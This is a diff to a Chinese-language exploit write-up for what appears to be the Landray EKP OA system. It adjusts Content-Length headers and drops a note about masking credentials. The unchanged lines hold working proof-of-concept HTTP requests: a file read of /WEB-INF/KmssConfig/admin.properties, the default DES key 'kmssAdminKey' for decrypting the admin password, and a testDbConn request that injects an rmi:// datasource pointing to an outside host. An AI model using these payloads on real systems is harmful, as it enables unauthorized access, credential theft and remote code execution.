@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -78,13 +78,14 @@ POC：
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Go-http-client/1.1
+Content-Length: 60
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip
 
 var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"\}\}
 ```
 
-> 请求长度说明：原资料 Content-Length 为 60；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 60；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 获取密码 DES 解密登陆后台：默认密钥为 kmssAdminKey
 
@@ -227,6 +228,7 @@ http://127.0.0.1/admin.do
 POST /admin.do HTTP/1.1
 Host: 127.0.0.1
 Cookie: JSESSIONID=; Hm_lvt_9838edd365000f753ebfdc508bf832d3=; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=
+Content-Length: 70
 Cache-Control: max-age=0
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
 Sec-Ch-Ua-Mobile: ?0
@@ -238,7 +240,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/thelostworld
 ```
 
-> 请求长度说明：原资料 Content-Length 为 70；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 70；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRje4G63OeC8nFZg4HLZEJU5BiaIu9CQWiaI4hLj0hsjyg2uIZvOJ402NHyS5gLtDkD6cjgluNILluYRw/640?wx_fmt=png)
 
